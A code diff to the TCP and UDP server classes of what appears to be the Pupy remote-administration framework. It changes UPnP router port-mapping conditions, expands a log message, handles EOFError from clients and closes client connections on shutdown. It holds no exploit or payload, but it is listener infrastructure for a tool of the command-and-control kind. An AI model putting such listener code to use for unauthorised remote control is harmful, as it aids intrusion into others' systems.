@@ -90,14 +90,15 @@ class PupyTCPServer(ThreadedServer):
                     'TCP',
                     self.port,
                     intIP=self.host if self.host and self.host not in (
-                        '', '0.0.0.0', 'igd'
+                        '', 'igd'
                     ) else None,
                     desc='pupy'
                 )
                 self.igd_mapping = True
             except UPNPError as e:
                 self.logger.warn(
-                    "Couldn't create IGD mapping: {}".format(e.description))
+                    "Couldn't create IGD mapping [TCP {} -> {}, IP={}]: {}".format(
+                        self.external_port, self.port, self.igd.intIP, e.description))
 
 
     def _setup_connection(self, sock, queue):
@@ -276,7 +277,7 @@ class PupyUDPServer(object):
                     'UDP',
                     self.port,
                     intIP=self.host if self.host and self.host not in (
-                        '', '::', '0.0.0.0', 'igd'
+                        '', 'igd'
                     ) else None,
                     desc='pupy'
                 )
@@ -397,7 +398,11 @@ class PupyUDPServer(object):
                         self.clients[f] = self.new(f, kcp)
 
                     for f in updated:
-                        x = self.clients[f].consume()
+                        try:
+                            x = self.clients[f].consume()
+                        except EOFError:
+                            x = None
+
                         if not x:
                             failed.add(f)
 
@@ -428,6 +433,9 @@ class PupyUDPServer(object):
 
     def close(self):
         self.active = False
+
+        for f in self.clients.keys():
+            self.clients[f].close()
 
         if self.sock:
             self.sock.close()
